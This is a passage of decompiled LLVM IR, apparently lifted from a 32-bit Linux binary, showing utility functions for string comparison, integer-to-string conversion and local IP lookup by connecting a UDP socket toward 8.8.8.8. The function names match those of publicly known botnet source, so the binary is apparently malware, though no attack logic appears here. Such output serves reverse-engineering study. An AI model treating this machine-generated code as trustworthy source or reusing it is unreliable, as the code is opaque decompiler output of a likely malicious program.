  %v0_8051204.pre27 = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v1_80511f626, label %dec_label_pc_80511e5.dec_label_pc_8051204_crit_edge, label %dec_label_pc_80511f8

dec_label_pc_80511e5.dec_label_pc_8051204_crit_edge: ; preds = %dec_label_pc_80511fd.dec_label_pc_80511e5_crit_edge, %entry
  %v0_8051204.pre.lcssa = phi i32 [ %v0_8051204.pre27, %entry ], [ %v0_8051204.pre, %dec_label_pc_80511fd.dec_label_pc_80511e5_crit_edge ]
  %v0_8051210.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051204

dec_label_pc_80511f8:                             ; preds = %entry, %dec_label_pc_80511fd.dec_label_pc_80511e5_crit_edge
  %v0_8051204.pre28 = phi i32 [ %v0_8051204.pre, %dec_label_pc_80511fd.dec_label_pc_80511e5_crit_edge ], [ %v0_8051204.pre27, %entry ]
  %v1_80511f8 = add i32 %v0_8051204.pre28, 1
  store i32 %v1_80511f8, i32* %ebx.global-to-local, align 4
  %v1_80511f9 = load i32, i32* %ebp.global-to-local, align 4
  %v5_80511fb = icmp slt i32 %v1_80511f8, %v1_80511f9
  %v1_80511fd = load i32, i32* %esi.global-to-local, align 4
  br i1 %v5_80511fb, label %dec_label_pc_80511fd, label %dec_label_pc_8051212

dec_label_pc_80511fd:                             ; preds = %dec_label_pc_80511f8
  %v3_80511fd = add i32 %v1_80511fd, %v0_8051204.pre28
  %v4_80511fd = inttoptr i32 %v3_80511fd to i8*
  %v5_80511fd = load i8, i8* %v4_80511fd, align 1
  %v14_80511fd = icmp eq i8 %v5_80511fd, 10
  %v1_8051202 = icmp eq i1 %v14_80511fd, false
  br i1 %v1_8051202, label %dec_label_pc_80511fd.dec_label_pc_80511e5_crit_edge, label %dec_label_pc_8051204

dec_label_pc_80511fd.dec_label_pc_80511e5_crit_edge: ; preds = %dec_label_pc_80511fd
  %v0_80511ec.pre = load i32, i32* %edi.global-to-local, align 4
  %v2_80511e5 = add i32 %v1_80511f8, %v1_80511fd
  store i32 %v2_80511e5, i32* @eax, align 4
  %v3_80511ed = call i32 @__libc_read(i32 %v0_80511ec.pre, i32 %v2_80511e5, i32 1)
  %v8_80511f5 = icmp eq i32 %v3_80511ed, 1
  %v1_80511f6 = icmp eq i1 %v8_80511f5, false
  %v0_8051204.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v1_80511f6, label %dec_label_pc_80511e5.dec_label_pc_8051204_crit_edge, label %dec_label_pc_80511f8

dec_label_pc_8051204:                             ; preds = %dec_label_pc_80511fd, %dec_label_pc_80511e5.dec_label_pc_8051204_crit_edge
  %v0_8051210 = phi i32 [ %v0_8051210.pre, %dec_label_pc_80511e5.dec_label_pc_8051204_crit_edge ], [ %v1_80511fd, %dec_label_pc_80511fd ]
  %v0_8051204 = phi i32 [ %v0_8051204.pre.lcssa, %dec_label_pc_80511e5.dec_label_pc_8051204_crit_edge ], [ %v1_80511f8, %dec_label_pc_80511fd ]
  %v1_8051204 = icmp eq i32 %v0_8051204, 0
  %v1_8051206 = icmp eq i1 %v1_8051204, false
  %v2_8051210 = select i1 %v1_8051206, i32 %v0_8051210, i32 0
  store i32 %v2_8051210, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051212

dec_label_pc_8051212:                             ; preds = %dec_label_pc_80511f8, %dec_label_pc_8051204
  %v0_8051215 = phi i32 [ %v2_8051210, %dec_label_pc_8051204 ], [ %v1_80511fd, %dec_label_pc_80511f8 ]
  ret i32 %v0_8051215

; uselistorder directives
  uselistorder i32 %v0_8051204.pre28, { 1, 0 }
  uselistorder i32 %v0_8051204.pre27, { 1, 0 }
  uselistorder label %dec_label_pc_8051212, { 1, 0 }
  uselistorder label %dec_label_pc_80511f8, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051220 = load i32, i32* @esi, align 4
  %v0_8051221 = load i32, i32* @ebx, align 4
  store i32 %v0_8051221, i32* %stack_var_-8, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v2_805122d = call i32 @__GI___errno_location(i32 16, i32 %v0_8051221)
  %v1_8051232 = inttoptr i32 %v2_805122d to i32*
  store i32 0, i32* %v1_8051232, align 4
  %v3_805123f = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_805123f, i32* @esi, align 4
  %v10_805124b = icmp eq i32 %v3_805123f, -1
  br i1 %v10_805124b, label %dec_label_pc_8051292, label %dec_label_pc_8051250

dec_label_pc_8051250:                             ; preds = %entry
  %v2_8051250 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051250, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_805126f = call i32 @__libc_connect(i32 %v3_805123f, i32 %v2_8051250, i32 16)
  %v2_8051277 = ptrtoint i32* %stack_var_-12 to i32
  %v0_805127d = load i32, i32* @esi, align 4
  %v3_805127e = call i32 @__GI_getsockname(i32 %v0_805127d, i32 %v2_8051250, i32 %v2_8051277)
  store i32 %v3_805127e, i32* @eax, align 4
  %v0_8051283 = load i32, i32* @esi, align 4
  %v1_8051286 = call i32 @__GI___libc_close(i32 %v0_8051283)
  br label %dec_label_pc_8051292

dec_label_pc_8051292:                             ; preds = %entry, %dec_label_pc_8051250
  %v0_8051297 = phi i32 [ 0, %entry ], [ 134744072, %dec_label_pc_8051250 ]
  %v2_8051295 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051295, i32* @ebx, align 4
  store i32 %v0_8051220, i32* @esi, align 4
  ret i32 %v0_8051297

; uselistorder directives
  uselistorder i32 %v3_805123f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 16, 14, 15, 13, 2, 1, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_8051292, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp18 = inttoptr i32 %arg3 to i8*
  %v2_80512b2 = load i8, i8* %tmp18, align 1
  %v3_80512b2 = icmp eq i8 %v2_80512b2, 0
  br i1 %v3_80512b2, label %dec_label_pc_80512c8, label %dec_label_pc_80512b8

dec_label_pc_80512b8:                             ; preds = %entry, %dec_label_pc_80512b8
  %v2_80512b8 = phi i32 [ %v1_80512bb, %dec_label_pc_80512b8 ], [ 0, %entry ]
  %v1_80512bb = add i32 %v2_80512b8, 1
  %v2_80512c2 = add i32 %v1_80512bb, %arg3
  %v3_80512c2 = inttoptr i32 %v2_80512c2 to i8*
  %v4_80512c2 = load i8, i8* %v3_80512c2, align 1
  %v5_80512c2 = icmp eq i8 %v4_80512c2, 0
  %v1_80512c6 = icmp eq i1 %v5_80512c2, false
  br i1 %v1_80512c6, label %dec_label_pc_80512b8, label %dec_label_pc_80512c8

dec_label_pc_80512c8:                             ; preds = %dec_label_pc_80512b8, %entry
  %v2_80512ff = phi i32 [ 0, %entry ], [ %v1_80512bb, %dec_label_pc_80512b8 ]
  %v4_80512ce = ptrtoint i8* %arg1 to i32
  %tmp25 = icmp slt i32 %arg2, 1
  br i1 %tmp25, label %dec_label_pc_80512fc, label %dec_label_pc_80512d6.preheader

dec_label_pc_80512d6.preheader:                   ; preds = %dec_label_pc_80512c8
  %v4_80512d6.pre = load i32, i32* @ecx, align 4
  %v6_80512d8.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80512d6

dec_label_pc_80512d6:                             ; preds = %dec_label_pc_80512d6.preheader, %dec_label_pc_80512f7
  %v0_80512f7 = phi i32 [ %arg2, %dec_label_pc_80512d6.preheader ], [ %v1_80512f7, %dec_label_pc_80512f7 ]
  %v6_80512d8 = phi i32 [ %v6_80512d8.pre, %dec_label_pc_80512d6.preheader ], [ %v2_80512f1, %dec_label_pc_80512f7 ]
  %v0_8051305 = phi i32 [ 0, %dec_label_pc_80512d6.preheader ], [ %v1_80512d88, %dec_label_pc_80512f7 ]
  %v4_80512d6 = phi i32 [ %v4_80512d6.pre, %dec_label_pc_80512d6.preheader ], [ %v0_80512f1, %dec_label_pc_80512f7 ]
  %v0_80512dc = phi i32 [ %v4_80512ce, %dec_label_pc_80512d6.preheader ], [ %v1_80512dc, %dec_label_pc_80512f7 ]
  %v1_80512d6 = inttoptr i32 %v0_80512dc to i8*
  %v2_80512d6 = load i8, i8* %v1_80512d6, align 1
  %v3_80512d6 = zext i8 %v2_80512d6 to i32
  %v5_80512d6 = and i32 %v4_80512d6, -256
  %v6_80512d6 = or i32 %v3_80512d6, %v5_80512d6
  store i32 %v6_80512d6, i32* @ecx, align 4
  %v2_80512d8 = add i32 %v0_8051305, %arg3
  %v3_80512d8 = inttoptr i32 %v2_80512d8 to i8*
  %v4_80512d8 = load i8, i8* %v3_80512d8, align 1
  %v5_80512d8 = zext i8 %v4_80512d8 to i32
  %v7_80512d8 = and i32 %v6_80512d8, -256
  %v8_80512d8 = or i32 %v5_80512d8, %v7_80512d8
  %v1_80512dc = add i32 %v0_80512dc, 1
  %v1_80512dd = add i8 %v2_80512d6, -65
  %v8_80512e2 = icmp ugt i8 %v1_80512dd, 25
  br i1 %v8_80512e2, label %dec_label_pc_80512e7, label %dec_label_pc_80512e4

dec_label_pc_80512e4:                             ; preds = %dec_label_pc_80512d6
  %v1_80512e4 = or i32 %v6_80512d6, 96
  store i32 %v1_80512e4, i32* @ecx, align 4
  br label %dec_label_pc_80512e7

dec_label_pc_80512e7:                             ; preds = %dec_label_pc_80512d6, %dec_label_pc_80512e4
  %v0_80512f1 = phi i32 [ %v6_80512d6, %dec_label_pc_80512d6 ], [ %v1_80512e4, %dec_label_pc_80512e4 ]
  %v1_80512e7 = add i8 %v4_80512d8, -65
  %v8_80512ec = icmp ugt i8 %v1_80512e7, 25
  br i1 %v8_80512ec, label %dec_label_pc_80512f1, label %dec_label_pc_80512ee

dec_label_pc_80512ee:                             ; preds = %dec_label_pc_80512e7
  %v1_80512ee = or i32 %v8_80512d8, 96
  br label %dec_label_pc_80512f1

dec_label_pc_80512f1:                             ; preds = %dec_label_pc_80512e7, %dec_label_pc_80512ee
  %v2_80512f1 = phi i32 [ %v8_80512d8, %dec_label_pc_80512e7 ], [ %v1_80512ee, %dec_label_pc_80512ee ]
  %v1_80512f1 = trunc i32 %v0_80512f1 to i8
  %v3_80512f1 = trunc i32 %v2_80512f1 to i8
  %v15_80512f1 = icmp eq i8 %v1_80512f1, %v3_80512f1
  br i1 %v15_80512f1, label %dec_label_pc_8051305, label %dec_label_pc_80512f5

dec_label_pc_80512f5:                             ; preds = %dec_label_pc_80512f1
  br label %dec_label_pc_80512f7

dec_label_pc_80512f7:                             ; preds = %dec_label_pc_8051305, %dec_label_pc_80512f5
  %v1_80512d88 = phi i32 [ %v1_8051305, %dec_label_pc_8051305 ], [ 0, %dec_label_pc_80512f5 ]
  %v1_80512f7 = add i32 %v0_80512f7, -1
  %tmp26 = icmp slt i32 %v1_80512f7, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_80512d6, label %dec_label_pc_80512fc

dec_label_pc_80512fc:                             ; preds = %dec_label_pc_80512f7, %dec_label_pc_80512c8
  store i32 %v2_80512ff, i32* @edx, align 4
  ret i32 -1

dec_label_pc_8051305:                             ; preds = %dec_label_pc_80512f1
  %v1_8051305 = add i32 %v0_8051305, 1
  %v14_8051306 = icmp eq i32 %v2_80512ff, %v1_8051305
  %v1_8051309 = icmp eq i1 %v14_8051306, false
  br i1 %v1_8051309, label %dec_label_pc_80512f7, label %dec_label_pc_805130b

dec_label_pc_805130b:                             ; preds = %dec_label_pc_8051305
  store i32 %v4_80512ce, i32* @ecx, align 4
  %v2_8051311 = sub i32 %v1_80512dc, %v4_80512ce
  store i32 %v2_80512ff, i32* @edx, align 4
  ret i32 %v2_8051311

; uselistorder directives
  uselistorder i32 %v1_80512f7, { 1, 0 }
  uselistorder i32 %v0_8051305, { 1, 0 }
  uselistorder i32 %v4_80512ce, { 2, 1, 0 }
  uselistorder i32 %v2_80512ff, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80512f1, { 1, 0 }
  uselistorder label %dec_label_pc_80512e7, { 1, 0 }
  uselistorder label %dec_label_pc_80512d6, { 1, 0 }
  uselistorder label %dec_label_pc_80512b8, { 1, 0 }
}

define i32 @util_strcmp() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_3()
  %tmp13 = call i8* @__decompiler_undefined_function_3()
  %v4_8051323 = ptrtoint i8* %tmp13 to i32
  %v4_8051327 = ptrtoint i8* %tmp to i32
  %v2_805132b = load i8, i8* %tmp13, align 1
  %v3_805132b = icmp eq i8 %v2_805132b, 0
  br i1 %v3_805132b, label %dec_label_pc_8051337, label %dec_label_pc_8051330

dec_label_pc_8051330:                             ; preds = %entry, %dec_label_pc_8051330
  %v0_8051330 = phi i32 [ %v1_8051330, %dec_label_pc_8051330 ], [ 0, %entry ]
  %v1_8051330 = add i32 %v0_8051330, 1
  %v2_8051331 = add i32 %v1_8051330, %v4_8051323
  %v3_8051331 = inttoptr i32 %v2_8051331 to i8*
  %v4_8051331 = load i8, i8* %v3_8051331, align 1
  %v5_8051331 = icmp eq i8 %v4_8051331, 0
  %v1_8051335 = icmp eq i1 %v5_8051331, false
  br i1 %v1_8051335, label %dec_label_pc_8051330, label %dec_label_pc_8051337

dec_label_pc_8051337:                             ; preds = %dec_label_pc_8051330, %entry
  %v0_8051347 = phi i32 [ 0, %entry ], [ %v1_8051330, %dec_label_pc_8051330 ]
  %v2_8051339 = load i8, i8* %tmp, align 1
  %v3_8051339 = icmp eq i8 %v2_8051339, 0
  br i1 %v3_8051339, label %dec_label_pc_8051347, label %dec_label_pc_8051340

dec_label_pc_8051340:                             ; preds = %dec_label_pc_8051337, %dec_label_pc_8051340
  %v0_8051340 = phi i32 [ %v1_8051340, %dec_label_pc_8051340 ], [ 0, %dec_label_pc_8051337 ]
  %v1_8051340 = add i32 %v0_8051340, 1
  %v2_8051341 = add i32 %v1_8051340, %v4_8051327
  %v3_8051341 = inttoptr i32 %v2_8051341 to i8*
  %v4_8051341 = load i8, i8* %v3_8051341, align 1
  %v5_8051341 = icmp eq i8 %v4_8051341, 0
  %v1_8051345 = icmp eq i1 %v5_8051341, false
  br i1 %v1_8051345, label %dec_label_pc_8051340, label %dec_label_pc_8051347

dec_label_pc_8051347:                             ; preds = %dec_label_pc_8051340, %dec_label_pc_8051337
  %v1_8051347 = phi i32 [ 0, %dec_label_pc_8051337 ], [ %v1_8051340, %dec_label_pc_8051340 ]
  %v12_8051347 = icmp eq i32 %v0_8051347, %v1_8051347
  br i1 %v12_8051347, label %dec_label_pc_8051352.preheader, label %dec_label_pc_805134d

dec_label_pc_8051352.preheader:                   ; preds = %dec_label_pc_8051347
  %v10_805135317 = icmp eq i32 %v0_8051347, 0
  br i1 %v10_805135317, label %dec_label_pc_8051362, label %dec_label_pc_8051358

dec_label_pc_805134d:                             ; preds = %dec_label_pc_8051358, %dec_label_pc_8051347
  ret i32 0

dec_label_pc_8051350:                             ; preds = %dec_label_pc_8051358
  %v3_8051358 = zext i8 %v2_8051358 to i32
  %v5_8051358 = and i32 %v4_805135819, -256
  %v6_8051358 = or i32 %v3_8051358, %v5_8051358
  %v1_8051350 = add i32 %v0_805135020, 1
  %v1_8051351 = add i32 %v0_805135118, 1
  %v10_8051353 = icmp eq i32 %v1_805135221, 0
  br i1 %v10_8051353, label %dec_label_pc_8051362, label %dec_label_pc_8051358

dec_label_pc_8051358:                             ; preds = %dec_label_pc_8051352.preheader, %dec_label_pc_8051350
  %v1_805135221.in = phi i32 [ %v1_805135221, %dec_label_pc_8051350 ], [ %v0_8051347, %dec_label_pc_8051352.preheader ]
  %v4_805135819 = phi i32 [ %v6_8051358, %dec_label_pc_8051350 ], [ %v0_8051347, %dec_label_pc_8051352.preheader ]
  %v0_805135020 = phi i32 [ %v1_8051350, %dec_label_pc_8051350 ], [ %v4_8051323, %dec_label_pc_8051352.preheader ]
  %v0_805135118 = phi i32 [ %v1_8051351, %dec_label_pc_8051350 ], [ %v4_8051327, %dec_label_pc_8051352.preheader ]
  %v1_805135221 = add i32 %v1_805135221.in, -1
  %v1_8051358 = inttoptr i32 %v0_805135020 to i8*
  %v2_8051358 = load i8, i8* %v1_8051358, align 1
  %v3_805135a = inttoptr i32 %v0_805135118 to i8*
  %v4_805135a = load i8, i8* %v3_805135a, align 1
  %v15_805135a = icmp eq i8 %v2_8051358, %v4_805135a
  br i1 %v15_805135a, label %dec_label_pc_8051350, label %dec_label_pc_805134d

dec_label_pc_8051362:                             ; preds = %dec_label_pc_8051350, %dec_label_pc_8051352.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v0_8051347, { 1, 0, 2, 3 }
  uselistorder i8* %tmp13, { 1, 0 }
  uselistorder label %dec_label_pc_8051358, { 1, 0 }
  uselistorder label %dec_label_pc_8051340, { 1, 0 }
  uselistorder label %dec_label_pc_8051330, { 1, 0 }
}

define i32 @util_strncmp() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_3()
  %tmp14 = call i8* @__decompiler_undefined_function_3()
  %v4_8051372 = ptrtoint i8* %tmp14 to i32
  store i32 %v4_8051372, i32* @ecx, align 4
  %v4_8051378 = ptrtoint i8* %tmp13 to i32
  %v2_8051380 = load i8, i8* %tmp14, align 1
  %v3_8051380 = icmp eq i8 %v2_8051380, 0
  br i1 %v3_8051380, label %dec_label_pc_805138c, label %dec_label_pc_8051385

dec_label_pc_8051385:                             ; preds = %entry, %dec_label_pc_8051385
  %v0_8051385 = phi i32 [ %v1_8051385, %dec_label_pc_8051385 ], [ 0, %entry ]
  %v1_8051385 = add i32 %v0_8051385, 1
  %v2_8051386 = add i32 %v1_8051385, %v4_8051372
  %v3_8051386 = inttoptr i32 %v2_8051386 to i8*
  %v4_8051386 = load i8, i8* %v3_8051386, align 1
  %v5_8051386 = icmp eq i8 %v4_8051386, 0
  %v1_805138a = icmp eq i1 %v5_8051386, false
  br i1 %v1_805138a, label %dec_label_pc_8051385, label %dec_label_pc_805138c

dec_label_pc_805138c:                             ; preds = %dec_label_pc_8051385, %entry
  %v0_805139a = phi i32 [ 0, %entry ], [ %v1_8051385, %dec_label_pc_8051385 ]
  %v2_805138e = load i8, i8* %tmp13, align 1
  %v3_805138e = icmp eq i8 %v2_805138e, 0
  br i1 %v3_805138e, label %dec_label_pc_805139a, label %dec_label_pc_8051393

dec_label_pc_8051393:                             ; preds = %dec_label_pc_805138c, %dec_label_pc_8051393
  %v0_8051393 = phi i32 [ %v1_8051393, %dec_label_pc_8051393 ], [ 0, %dec_label_pc_805138c ]
  %v1_8051393 = add i32 %v0_8051393, 1
  %v2_8051394 = add i32 %v1_8051393, %v4_8051378
  %v3_8051394 = inttoptr i32 %v2_8051394 to i8*
  %v4_8051394 = load i8, i8* %v3_8051394, align 1
  %v5_8051394 = icmp eq i8 %v4_8051394, 0
  %v1_8051398 = icmp eq i1 %v5_8051394, false
  br i1 %v1_8051398, label %dec_label_pc_8051393, label %dec_label_pc_805139a

dec_label_pc_805139a:                             ; preds = %dec_label_pc_8051393, %dec_label_pc_805138c
  %v0_805139e = phi i32 [ 0, %dec_label_pc_805138c ], [ %v1_8051393, %dec_label_pc_8051393 ]
  %v5_805139c = icmp slt i32 %v0_805139a, %tmp
  br i1 %v5_805139c, label %dec_label_pc_80513a2, label %dec_label_pc_805139e

dec_label_pc_805139e:                             ; preds = %dec_label_pc_805139a
  %v5_80513a0 = icmp slt i32 %v0_805139e, %tmp
  br i1 %v5_80513a0, label %dec_label_pc_80513a2, label %dec_label_pc_80513a9.preheader

dec_label_pc_80513a9.preheader:                   ; preds = %dec_label_pc_805139e
  %v10_80513aa19 = icmp eq i32 %tmp, 0
  br i1 %v10_80513aa19, label %dec_label_pc_80513b7, label %dec_label_pc_80513af

dec_label_pc_80513a2:                             ; preds = %dec_label_pc_80513af, %dec_label_pc_805139e, %dec_label_pc_805139a
  ret i32 0

dec_label_pc_80513a7:                             ; preds = %dec_label_pc_80513af
  %v3_80513af = zext i8 %v2_80513af to i32
  %v5_80513af = and i32 %v4_80513af21, -256
  %v6_80513af = or i32 %v3_80513af, %v5_80513af
  %v1_80513a7 = add i32 %v0_80513a722, 1
  store i32 %v1_80513a7, i32* @ecx, align 4
  %v1_80513a8 = add i32 %v0_80513a820, 1
  %v10_80513aa = icmp eq i32 %v1_80513a923, 0
  br i1 %v10_80513aa, label %dec_label_pc_80513b7, label %dec_label_pc_80513af

dec_label_pc_80513af:                             ; preds = %dec_label_pc_80513a9.preheader, %dec_label_pc_80513a7
  %v1_80513a923.in = phi i32 [ %v1_80513a923, %dec_label_pc_80513a7 ], [ %tmp, %dec_label_pc_80513a9.preheader ]
  %v0_80513a722 = phi i32 [ %v1_80513a7, %dec_label_pc_80513a7 ], [ %v4_8051372, %dec_label_pc_80513a9.preheader ]
  %v4_80513af21 = phi i32 [ %v6_80513af, %dec_label_pc_80513a7 ], [ %v0_805139e, %dec_label_pc_80513a9.preheader ]
  %v0_80513a820 = phi i32 [ %v1_80513a8, %dec_label_pc_80513a7 ], [ %v4_8051378, %dec_label_pc_80513a9.preheader ]
  %v1_80513a923 = add i32 %v1_80513a923.in, -1
  %v1_80513af = inttoptr i32 %v0_80513a722 to i8*
  %v2_80513af = load i8, i8* %v1_80513af, align 1
  %v3_80513b1 = inttoptr i32 %v0_80513a820 to i8*
  %v4_80513b1 = load i8, i8* %v3_80513b1, align 1
  %v15_80513b1 = icmp eq i8 %v2_80513af, %v4_80513b1
  br i1 %v15_80513b1, label %dec_label_pc_80513a7, label %dec_label_pc_80513a2

dec_label_pc_80513b7:                             ; preds = %dec_label_pc_80513a7, %dec_label_pc_80513a9.preheader
  ret i32 1

; uselistorder directives
  uselistorder label %dec_label_pc_80513af, { 1, 0 }
  uselistorder label %dec_label_pc_8051393, { 1, 0 }
  uselistorder label %dec_label_pc_8051385, { 1, 0 }
}

define i32 @util_itoa(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp25 = inttoptr i32 %arg3 to i8*
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %v4_80513cb = trunc i64 %arg1 to i32
  store i32 %v4_80513cb, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_80513d3 = icmp eq i32 %arg3, 0
  br i1 %v2_80513d3, label %dec_label_pc_805144c, label %dec_label_pc_80513d7

dec_label_pc_80513d7:                             ; preds = %entry
  %v2_80513d7 = icmp eq i32 %v4_80513cb, 0
  %v3_80513d7 = icmp slt i32 %v4_80513cb, 0
  br i1 %v2_80513d7, label %dec_label_pc_8051456, label %dec_label_pc_80513db

dec_label_pc_80513db:                             ; preds = %dec_label_pc_80513d7
  %v9_80513e0 = icmp eq i32 %arg2, 10
  br i1 %v9_80513e0, label %dec_label_pc_805146b, label %dec_label_pc_80513e9

dec_label_pc_80513e9:                             ; preds = %dec_label_pc_805146b, %dec_label_pc_80513db
  store i32 %v4_80513cb, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  br label %dec_label_pc_80513f2

dec_label_pc_80513f2:                             ; preds = %dec_label_pc_8051473, %dec_label_pc_80513e9
  %v0_80514025 = phi i32 [ %v1_805147c, %dec_label_pc_8051473 ], [ %v4_80513cb, %dec_label_pc_80513e9 ]
  store i32 32, i32* %ebx.global-to-local, align 4
  %v2_80513f7 = ptrtoint i32* %stack_var_-50 to i32
  store i32 %v2_80513f7, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051400

dec_label_pc_8051400:                             ; preds = %dec_label_pc_8051400.dec_label_pc_8051400_crit_edge, %dec_label_pc_80513f2
  %v3_8051411 = phi i32 [ %v3_8051411.pre, %dec_label_pc_8051400.dec_label_pc_8051400_crit_edge ], [ %v2_80513f7, %dec_label_pc_80513f2 ]
  %v2_8051411 = phi i32 [ %v1_8051418, %dec_label_pc_8051400.dec_label_pc_8051400_crit_edge ], [ 32, %dec_label_pc_80513f2 ]
  %v0_8051404 = phi i32 [ %v0_8051419, %dec_label_pc_8051400.dec_label_pc_8051400_crit_edge ], [ %arg2, %dec_label_pc_80513f2 ]
  %v0_8051402 = phi i32 [ %div21, %dec_label_pc_8051400.dec_label_pc_8051400_crit_edge ], [ %v0_80514025, %dec_label_pc_80513f2 ]
  %tmp33 = urem i32 %v0_8051402, %v0_8051404
  %v7_805140c = icmp sgt i32 %tmp33, 9
  %v1_805140e.v1_8051409.v = select i1 %v7_805140c, i32 55, i32 48
  %v1_805140e.v1_8051409 = add i32 %v1_805140e.v1_8051409.v, %tmp33
  %v1_8051411 = trunc i32 %v1_805140e.v1_8051409 to i8
  %v4_8051411 = add i32 %v3_8051411, %v2_8051411
  %v5_8051411 = inttoptr i32 %v4_8051411 to i8*
  store i8 %v1_8051411, i8* %v5_8051411, align 1
  %v0_8051416 = load i32, i32* %ecx.global-to-local, align 4
  %v0_8051418 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051418 = add i32 %v0_8051418, -1
  store i32 %v1_8051418, i32* %ebx.global-to-local, align 4
  %v0_8051419 = load i32, i32* %esi.global-to-local, align 4
  %div21 = udiv i32 %v0_8051416, %v0_8051419
  store i32 %div21, i32* %eax.global-to-local, align 4
  %tmp34 = urem i32 %v0_8051416, %v0_8051419
  store i32 %tmp34, i32* %edx.global-to-local, align 4
  store i32 %div21, i32* %ecx.global-to-local, align 4
  %v1_805141d = icmp ugt i32 %v0_8051419, %v0_8051416
  %v1_805141f = icmp eq i1 %v1_805141d, false
  br i1 %v1_805141f, label %dec_label_pc_8051400.dec_label_pc_8051400_crit_edge, label %dec_label_pc_8051421

dec_label_pc_8051400.dec_label_pc_8051400_crit_edge: ; preds = %dec_label_pc_8051400
  %v3_8051411.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051400

dec_label_pc_8051421:                             ; preds = %dec_label_pc_8051400
  %v2_8051421 = load i32, i32* %stack_var_-68, align 4
  store i32 %v2_8051421, i32* %esi.global-to-local, align 4
  %v1_8051424 = icmp eq i32 %v2_8051421, 0
  br i1 %v1_8051424, label %dec_label_pc_8051468, label %dec_label_pc_8051428

dec_label_pc_8051428:                             ; preds = %dec_label_pc_8051421
  %v0_8051428 = load i32, i32* @esp, align 4
  %v2_8051428 = add i32 %v0_8051418, 17
  %v3_8051428 = add i32 %v2_8051428, %v0_8051428
  %v4_8051428 = inttoptr i32 %v3_8051428 to i8*
  store i8 45, i8* %v4_8051428, align 1
  %v1_805142d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805142d

dec_label_pc_805142d:                             ; preds = %dec_label_pc_8051468, %dec_label_pc_8051428
  %v1_805142d = phi i32 [ %v0_8051418, %dec_label_pc_8051468 ], [ %v1_805142d.pre, %dec_label_pc_8051428 ]
  %v0_805142d = load i32, i32* %edi.global-to-local, align 4
  %v2_805142d = add i32 %v0_805142d, %v1_805142d
  store i32 %v2_805142d, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051432 = inttoptr i32 %v2_805142d to i8*
  %v2_8051432 = load i8, i8* %v1_8051432, align 1
  %v3_8051432 = icmp eq i8 %v2_8051432, 0
  br i1 %v3_8051432, label %dec_label_pc_805143e, label %dec_label_pc_8051437

dec_label_pc_8051437:                             ; preds = %dec_label_pc_805142d, %dec_label_pc_8051437
  %v0_8051437 = phi i32 [ %v1_8051437, %dec_label_pc_8051437 ], [ 0, %dec_label_pc_805142d ]
  %v1_8051437 = add i32 %v0_8051437, 1
  store i32 %v1_8051437, i32* %ebx.global-to-local, align 4
  %v2_8051438 = add i32 %v1_8051437, %v2_805142d
  %v3_8051438 = inttoptr i32 %v2_8051438 to i8*
  %v4_8051438 = load i8, i8* %v3_8051438, align 1
  %v5_8051438 = icmp eq i8 %v4_8051438, 0
  %v1_805143c = icmp eq i1 %v5_8051438, false
  br i1 %v1_805143c, label %dec_label_pc_8051437, label %dec_label_pc_805143e

dec_label_pc_805143e:                             ; preds = %dec_label_pc_8051437, %dec_label_pc_805142d
  %v0_805144213 = phi i32 [ 0, %dec_label_pc_805142d ], [ %v1_8051437, %dec_label_pc_8051437 ]
  store i32 %arg3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051440

dec_label_pc_8051440:                             ; preds = %dec_label_pc_8051440, %dec_label_pc_805143e
  %v2_8051443 = phi i32 [ %v1_8051446, %dec_label_pc_8051440 ], [ %arg3, %dec_label_pc_805143e ]
  %v0_8051442 = phi i32 [ %v0_8051447, %dec_label_pc_8051440 ], [ %v0_805144213, %dec_label_pc_805143e ]
  %v0_8051440 = phi i32 [ %v1_8051445, %dec_label_pc_8051440 ], [ %v2_805142d, %dec_label_pc_805143e ]
  %v1_8051440 = inttoptr i32 %v0_8051440 to i8*
  %v2_8051440 = load i8, i8* %v1_8051440, align 1
  %v3_8051440 = zext i8 %v2_8051440 to i32
  %v4_8051440 = load i32, i32* %eax.global-to-local, align 4
